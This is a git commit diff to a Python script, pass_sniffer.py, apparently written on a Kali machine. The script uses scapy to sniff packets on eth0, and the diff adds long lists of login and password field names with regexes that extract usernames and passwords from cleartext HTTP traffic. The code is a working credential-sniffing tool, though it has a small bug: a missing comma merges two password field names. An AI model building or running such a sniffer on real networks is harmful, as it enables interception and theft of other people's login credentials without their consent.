c5e13e04e7234ecdae2a817a65950a85f7ab63e9
Kali machine <yelionel26@gmail.com>
2022-10-28 12:13:12 -0400

    Finding password pattern

--- passwordsniff/pass_sniffer.py
+++ passwordsniff/pass_sniffer.py
@@ -5,14 +5,37 @@ import re
 
 iface = 'eth0'
 
-def get_login_pass():
+def get_login_pass(body):
     user = None
     passwd = None
+
+    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
+                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
+                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
+                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
+    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
+                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
+                  'login_password'
+                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
+
+    for login in userfields:
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+        if login_re:
+            user = login_re.group()
+    for pass_field in passfields:
+        pass_re = re.search('(%s=[^&]+)' % pass_field, body, re.IGNORECASE)
+        if pass_re:
+            passwd = pass_re.group()
+
+    if user and passwd:
+        return user, passwd
+
 
 def pkt_parser(packet):
     if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
         body = str(packet[TCP].payload)
-        get_login_pass(body)
+        username, password = get_login_pass(body)
 
 try:
     sniff(iface=iface, prn=pkt_parser, store=0)
